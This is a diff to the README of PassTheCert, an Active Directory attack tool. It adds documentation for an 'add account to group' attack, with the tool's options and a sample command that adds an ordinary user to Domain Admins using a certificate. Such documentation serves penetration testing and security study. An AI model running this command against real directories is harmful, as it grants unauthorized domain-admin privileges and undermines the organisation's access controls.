@@ -211,3 +211,20 @@ Generated password: m6QQ3OfbULmyiwBsNJS9NzvlVER8rWj7
 Success
 ```
 
+### Add account to group
+
+The options for this attack are:
+
+```
+ADD ACCOUNT TO GROUP ATTACK OPTIONS: --target TARGET --account ACCOUNT
+        --target TARGET
+                Target of the attack. Should be the distinguished name of the group.
+        --account ACCOUNT
+                The account added to the group. Should be the distinguished name of the account.
+```
+
+Here's an example of usage:
+```console
+C:\> .\PassTheCert.exe --server srv-ad.contoso.com --cert-path Z:\skywalker.pfx --add-account-to-group --target "CN=Domain Admins,CN=Users,DC=contoso,DC=com" --account "CN=simple_user,CN=Users,DC=contoso,DC=com"
+Success
+```
